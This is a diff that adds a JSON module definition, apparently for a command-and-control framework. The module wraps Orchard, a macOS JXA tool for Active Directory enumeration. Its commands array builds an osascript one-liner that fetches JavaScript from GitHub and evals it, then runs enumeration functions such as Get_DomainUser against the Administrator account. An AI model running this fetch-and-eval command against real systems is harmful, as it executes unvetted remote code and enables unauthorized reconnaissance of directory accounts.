@@ -1,0 +1,34 @@
+{
+  "base": {
+    "name": "Orchard",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Cody Thomas (@its_a_feature_)"],
+    "path": ["darwin", "x64", "javascript", "enumeration", "orchard.json"],
+    "platform": "darwin",
+    "arch": "x64",
+    "lang": "JavaScript",
+    "privilege": false,
+    "remote": "https://raw.githubusercontent.com/its-a-feature/Orchard/master/Orchard.js",
+    "options": [
+      {"name": "function", "value": "Get_DomainUser", "flag":"", "required": true, "description":"The Orchard, case-sensitive, function name to run. DO NOT include the function brackets ()"},
+      {"name": "args", "value":"{user:'Administrator',verbose:true}", "flag":"", "required": false, "description":"Arguments to pass to the function as a JSON structure. Use single quotes inplace of double quotes"}
+    ],
+    "description": "JavaScript for Automation (JXA) tool to do Active Directory enumeration. Live off the land for macOS. This program allows users to do Active Directory enumeration via macOS' JXA (JavaScript for Automation) code. This is the newest version of AppleScript, and thus has very poor documentation on the web.",
+    "notes": "View the README at https://github.com/its-a-feature/Orchard/blob/master/README.md for a list of function names.\r\n\r\n\t**OPSEC NOTE** This module connects directly to GitHub to download a file.",
+    "commands": [
+      "osascript",
+      "-l",
+      "JavaScript",
+      "-e",
+      "\"eval(ObjC.unwrap( $.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('https://raw.githubusercontent.com/its-a-feature/Orchard/master/Orchard.js')), $.NSUTF8StringEncoding)))",
+      ";",
+      "{{function.Value}}",
+      "(",
+      "{{args.Value}}",
+      ")",
+      "\""
+    ],
+    "Comments": "If you think this is cool, check out Mythic at https://github.com/its-a-feature/Mythic"
+  }
+}
